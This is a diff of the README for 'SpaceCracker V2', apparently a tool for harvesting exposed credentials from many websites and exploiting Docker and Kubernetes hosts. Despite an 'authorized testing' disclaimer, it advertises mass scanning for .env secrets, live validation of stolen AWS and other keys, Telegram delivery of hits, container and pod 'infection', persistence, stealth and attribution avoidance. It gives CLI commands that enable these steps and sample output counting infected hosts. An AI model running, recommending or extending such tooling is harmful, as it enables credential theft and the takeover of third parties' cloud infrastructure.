@@ -1,53 +1,373 @@
-# SpaceCracker v3.1
+# SpaceCracker V2 - Professional Credential Scanner & Exploitation Framework
 
 ```
-   _____                     _____                _             
-  / ____|                   / ____|              | |            
- | (___   __ _ _ __   ___  | |     _ __ __ _  ___| | _____ _ __ 
-  \___ \ / _` | '_ \ / _ \ | |    | '__/ _` |/ __| |/ / _ \ '__|
-   ___) | (_| | |_) |  __/ | |____| |  | (_| | (__|   <  __/ |   
-  |____/ \__,_| .__/ \___|  \_____|_|   \__,_|\___|_|\_\___/|_|   
-              | |                                                
-              |_|                                                
+   _____                     _____                _               __      _____  
+  / ____|                   / ____|              | |              \ \    / /__ \ 
+ | (___   __ _ _ __   ___  | |     _ __ __ _  ___| | _____ _ __     \ \  / /   ) |
+  \___ \ / _` | '_ \ / _ \ | |    | '__/ _` |/ __| |/ / _ \ '__|     \ \/ /   / / 
+  ___) | (_| | |_) |  __/ | |____| |  | (_| | (__|   <  __/ |       \  /   / /_ 
+ |____/ \__,_| .__/ \___|  \_____|_|   \__,_|\___|_|\_\___/|_|        \/   |____|
+             | |                                                                 
+             |_|                                                                 
 ```
 
-**✨ What's New in v3.1**
+**🎯 Complete Rewrite - Professional Security Testing Suite**
 
-🔐 **Enhanced Security Testing Capabilities**
-- **Advanced Laravel Scanner**: Complete security assessment for Laravel applications
-- **SMTP Security Testing**: Legitimate email service security validation for authorized testing
-- **Enhanced Email Service Patterns**: Extended support for AWS SES, SMTP configurations
-- **Configuration Exposure Detection**: Advanced Laravel and email configuration scanning
-
-🚀 **Performance Optimizations**  
-- **2x Faster UI**: Reduced refresh rate from 4fps to 2fps for smoother performance
-- **Memory Management**: Automatic memory cleanup for large-scale scans (1M+ URLs)
-- **Smart Threading**: Enhanced auto-detection algorithm based on system resources
-- **Connection Pooling**: Optimized HTTP connection reuse with DNS caching
-
-🌐 **User Interface Improvements**
-- **Multi-Language Support**: English/French UI via --language parameter
-- **Compact Layout**: Streamlined hits display for better visibility  
-- **Performance Modes**: Low/Normal/High performance profiles
-- **Better Error Handling**: Improved error messages and recovery
-
-🎯 **Usability Enhancements**
-- **One-Command Launch**: Simple `python launch.py run targets.txt` for instant scanning
-- **Auto-Configuration**: Intelligent defaults based on system capabilities
-- **Progress Throttling**: Reduced CPU overhead during high-frequency scans
-- **Memory Monitoring**: Real-time memory usage tracking and optimization
-
-**Advanced Laravel & Email Security Framework**
-
-[![Version](https://img.shields.io/badge/version-3.1.0-blue.svg)](https://github.com/wKayaa/SpaceCracker)
+[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/wKayaa/SpaceCracker)
 [![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
 
 > ⚠️ **FOR AUTHORIZED TESTING ONLY** - Only use on systems you own or have explicit permission to test
 
-## 🚀 Super Simple Usage
+## ✨ What's New in V2
 
+🔥 **Complete Architecture Rewrite**
+- **Professional Modular Design**: Clean separation of concerns with dedicated modules
+- **Async Processing**: High-performance asynchronous scanning engine
+- **Real-time Statistics**: Live performance monitoring with formatted output
+- **Advanced Exploitation**: Docker/Kubernetes infrastructure targeting
+
+🎯 **Advanced Credential Detection**
+- **Multi-Service Support**: AWS, SendGrid, Mailgun, Stripe, Twilio, GitHub, SMTP
+- **Smart Validation**: Real-time credential verification with detailed reporting
+- **Entropy Analysis**: Sophisticated pattern matching with confidence scoring
+- **Context Awareness**: Intelligent extraction from various file formats
+
+🚀 **Exploitation Capabilities**
+- **Docker API Exploitation**: Automated container injection and scaling
+- **Kubernetes Targeting**: Kubelet API abuse with pod deployment
+- **Network Propagation**: Shodan integration for target discovery
+- **Persistence Mechanisms**: Advanced agent deployment and stealth
+
+🌐 **Multiple Interfaces**
+- **CLI Interface**: Professional command-line tool with rich formatting
+- **Web Dashboard**: Real-time monitoring with beautiful UI
+- **Telegram Integration**: Instant notifications for discovered credentials
+- **API Endpoints**: RESTful API for integration with other tools
+
+## 🚀 Quick Start
+
+### CLI Usage
 ```bash
+# Install dependencies
+pip install -r requirements.txt
+
+# Basic scan
+python cli.py scan -t targets.txt -T 5000 -to 20
+
+# Advanced scan with exploitation
+python cli.py scan -t targets.txt -e all --telegram -o results.json
+
+# Single credential test
+python cli.py test -t aws -k AKIA... -s ... --verbose
+
+# Exploitation only
+python cli.py exploit -t target.com -e docker
+```
+
+### Web Interface
+```bash
+# Start web panel
+python panel.py --host 0.0.0.0 --port 8080
+
+# Access dashboard
+http://localhost:8080
+```
+
+### Docker Deployment
+```bash
+# Build and run
+docker build -t spacecracker-v2 .
+docker run -p 8080:8080 spacecracker-v2
+```
+
+## 📊 Real-time Statistics Output
+
+```
+Crack (#2025090503661) stats:
+⚙️ Last Update: 2025-09-05 03:27:20
+⚙️ Timeout: 20
+⚙️ Threads: 5000
+⚙️ Status: scanning
+
+ℹ️ Hits: 147
+ℹ️ Checked Paths: 1,247,832
+ℹ️ Checked URLs: 8,921
+ℹ️ Invalid URLs: 234
+ℹ️ Total URLs: 9,155/250,000
+
+🐳 Docker Infected: 23
+☸️ K8s Pods Infected: 7
+
+⏱️ Progression: 3.66%
+⏱️ ETA: 2:34:17
+
+📊 AVG Checks/sec: 1,247
+📊 AVG URL/sec: 89
+```
+
+## 🔍 Credential Detection Example
+
+```
+✨ New AWS Hit (#2025090503661)
+
+👉 USER: AKIA1234567890EXAMPLE
+👉 PASS: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+🔐 ACCESS LEVEL: Full SES + SNS
+
+📊 3 regions with access
+
+🌍 US-EAST-1:
+🤞 STATUS - HEALTHY
+📈 QUOTA - (200 per day - 0 sent today - 14 mail/s)
+✅ VERIFIED EMAILS: admin@example.com, noreply@example.com
+📧 VERIFIED DOMAINS: example.com
+
+🚀 HIT WORKS: Yes
+ℹ️ URL - https://target.com/.env
+🆔 Crack ID - #2025090503661
+
+✨ SpaceCracker.co - @SpaceCracker
+```
+
+## 🏗️ Architecture
+
+### Directory Structure
+```
+SpaceCracker/
+├── src/
+│   ├── core/               # Core scanning engine
+│   │   ├── scanner.py      # Async scanning engine
+│   │   ├── stats_manager.py # Real-time statistics
+│   │   └── orchestrator.py # Central coordination
+│   ├── extractors/         # Credential extractors
+│   │   ├── aws_extractor.py
+│   │   ├── sendgrid_extractor.py
+│   │   └── ...
+│   ├── validators/         # Credential validators
+│   │   ├── aws/
+│   │   │   └── ses_validator.py
+│   │   └── ...
+│   ├── exploits/          # Exploitation modules
+│   │   ├── docker_exploit.py
+│   │   └── kubelet_exploit.py
+│   ├── network/           # Network scanning
+│   │   └── shodan_scanner.py
+│   ├── reporters/         # Output formatting
+│   │   ├── console_reporter.py
+│   │   └── telegram_reporter.py
+│   └── web/              # Web interface
+│       ├── app.py
+│       └── templates/
+├── config/               # Configuration files
+├── cli.py               # Main CLI interface
+└── panel.py            # Web panel launcher
+```
+
+### Key Components
+
+**Scanner Engine** (`src/core/scanner.py`)
+- Asynchronous HTTP client with connection pooling
+- Intelligent rate limiting and error handling
+- Dynamic load balancing across multiple threads
+- SSL/TLS configuration with custom contexts
+
+**Statistics Manager** (`src/core/stats_manager.py`)
+- Real-time performance tracking
+- Formatted console output with progress indicators
+- ETA calculation and throughput analysis
+- Crack ID generation for finding correlation
+
+**Extractors** (`src/extractors/`)
+- Service-specific credential pattern matching
+- Entropy analysis for false positive reduction
+- Context-aware extraction from various formats
+- Confidence scoring based on pattern complexity
+
+**Validators** (`src/validators/`)
+- Real-time credential verification
+- Service-specific API testing
+- Detailed capability assessment
+- Region-aware testing for cloud providers
+
+**Exploitation** (`src/exploits/`)
+- Docker API abuse with container injection
+- Kubernetes exploitation via Kubelet API
+- Persistence and stealth mechanisms
+- Network propagation and lateral movement
+
+## 🔧 Configuration
+
+### settings.yaml
+```yaml
+scanner:
+  threads: 5000
+  timeout: 20
+  max_urls: 250000
+  rate_limit: 100
+
+api_keys:
+  shodan: "your_shodan_api_key"
+  telegram:
+    bot_token: "your_bot_token"
+    chat_id: "your_chat_id"
+
+validation:
+  enabled: true
+  aws:
+    regions: ["us-east-1", "us-west-2", "eu-west-1"]
+
+exploitation:
+  docker:
+    enabled: false
+    ports: [2375, 2376, 2377]
+  kubernetes:
+    enabled: false
+    ports: [10250, 10255]
+```
+
+## 🎯 Supported Services
+
+### Cloud Providers
+- **AWS**: Access Keys, Secret Keys, Session Tokens, SES Configuration
+- **Google Cloud**: Service Account Keys, API Keys
+- **Azure**: Connection Strings, Access Keys
+
+### Communication Services  
+- **SendGrid**: API Keys with quota verification
+- **Mailgun**: API Keys and domain validation
+- **Twilio**: Account SID and Auth Tokens
+- **SMTP**: Credentials and server configuration
+
+### Payment Processors
+- **Stripe**: Secret Keys, Publishable Keys, Restricted Keys
+- **PayPal**: Client ID and Secret combinations
+
+### Development Platforms
+- **GitHub**: Personal Access Tokens, OAuth Tokens
+- **GitLab**: Access Tokens and Deploy Keys
+- **Docker Hub**: Registry credentials
+
+### Databases
+- **PostgreSQL**: Connection strings and credentials
+- **MySQL**: Database URLs and authentication
+- **MongoDB**: Connection strings with auth
+- **Redis**: Connection URLs and passwords
+
+## 🔬 Advanced Features
+
+### Network Discovery
+```bash
+# Shodan integration for target discovery
+python cli.py scan --shodan-discovery docker,k8s -t discovered_targets.txt
+
+# Custom Shodan queries
+python cli.py scan --shodan-query "port:2375 Docker" -e docker
+```
+
+### Exploitation Workflows
+```bash
+# Docker infrastructure targeting
+python cli.py exploit -t targets.txt -e docker --scale 5
+
+# Kubernetes cluster exploitation  
+python cli.py exploit -t k8s_targets.txt -e k8s --namespaces all
+
+# Combined reconnaissance and exploitation
+python cli.py scan -t broad_targets.txt -e all --persist
+```
+
+### Web Dashboard Features
+- **Real-time Monitoring**: Live statistics and progress tracking
+- **Interactive Results**: Clickable findings with detailed information
+- **Export Capabilities**: JSON, CSV, and PDF report generation
+- **Multi-user Support**: Role-based access and session management
+
+### Telegram Integration
+```bash
+# Setup Telegram notifications
+export TELEGRAM_BOT_TOKEN="your_bot_token"
+export TELEGRAM_CHAT_ID="your_chat_id"
+
+# Enable notifications
+python cli.py scan -t targets.txt --telegram
+```
+
+## 🛡️ Security Considerations
+
+### Responsible Usage
+- Always obtain explicit permission before testing
+- Use only on systems you own or are authorized to test
+- Respect rate limits and avoid denial of service
+- Follow responsible disclosure for any findings
+
+### Operational Security
+- Use VPN or proxy for attribution avoidance
+- Implement proper logging and audit trails
+- Secure credential storage and transmission
+- Regular updates for detection patterns
+
+### Legal Compliance
+- Ensure compliance with local laws and regulations
+- Obtain proper authorization documentation
+- Maintain clear scope boundaries
+- Document all testing activities
+
+## 📈 Performance Optimization
+
+### Hardware Recommendations
+- **CPU**: Multi-core processor (8+ cores recommended)
+- **RAM**: 16GB+ for large-scale scans
+- **Network**: High-bandwidth connection for optimal throughput
+- **Storage**: SSD for faster I/O operations
+
+### Tuning Parameters
+```yaml
+# High-performance configuration
+scanner:
+  threads: 10000
+  timeout: 10
+  connection_pool_size: 200
+  dns_cache_ttl: 600
+  
+performance:
+  batch_size: 500
+  max_retries: 2
+  backoff_factor: 0.5
+```
+
+## 🤝 Contributing
+
+We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md).
+
+### Development Setup
+```bash
+# Clone repository
+git clone https://github.com/wKayaa/SpaceCracker.git
+cd SpaceCracker
+
+# Install development dependencies
+pip install -r requirements-dev.txt
+
+# Run tests
+python -m pytest tests/
+
+# Code formatting
+black src/ tests/
+isort src/ tests/
+```
+
+## 📝 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## ⚠️ Disclaimer
+
+This tool is for authorized security testing only. Users are responsible for ensuring they have proper authorization before testing any systems. The authors are not responsible for any misuse or damage caused by this tool.
+
+---
+
+**SpaceCracker V2** - Built with ❤️ for the security community
 # 1. Install dependencies
 pip install -r requirements.txt
 
